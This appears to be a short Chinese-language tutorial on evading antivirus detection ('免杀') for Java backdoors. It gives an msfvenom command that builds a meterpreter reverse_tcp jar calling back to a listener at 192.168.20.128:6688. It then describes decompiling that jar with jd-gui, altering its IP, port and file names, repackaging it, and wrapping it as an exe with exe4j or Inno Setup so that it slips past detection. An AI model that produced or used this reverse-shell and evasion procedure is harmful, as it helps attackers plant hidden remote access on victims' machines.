## **java免杀**
java一般是webshell免杀

对于可执行文件上线后门
一是msf生成jar后，执行java -jar payload.jar时免杀。
二是jar打包成exe可执行文件后，免杀。


^
**对于一，需要用jd-gui反编译jar后，修改代码，再重新打包成jar包。**
msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.20.128 LPORT=6688 -f jar -o 6688.jar

反编译后会生成三个文件，META-INF、java、bat
bat中为ip和端口号。
全部修改，文件名修改。



1. 编译Java文件：
   ```
   javac HelloWorld.java
   ```

2. 创建 `META-INF` 目录和 `MANIFEST.MF` 文件：
   ```
   mkdir META-INF
   echo 'Manifest-Version: 1.0' > META-INF/MANIFEST.MF
   echo 'Created-By: 1.8.0_231 (Oracle Corporation)' >> META-INF/MANIFEST.MF
   echo 'Main-Class: HelloWorld' >> META-INF/MANIFEST.MF
   ```

3. 打包成 `.jar` 文件：

   ```
   jar cfm HelloWorld.jar META-INF/MANIFEST.MF HelloWorld.class
   ```

4. 运行 `.jar` 文件：

   ```
   java -jar HelloWorld.jar
   ```


^
**对于二，使用exe4j 或inno进行打包exe**
exe4j-下载链接：https://exe4j.apponic.com/
inno-下载链接：https:/jrsoftware.org/isdl.php
操作说明：https://www.jb51.net/article/236000.htm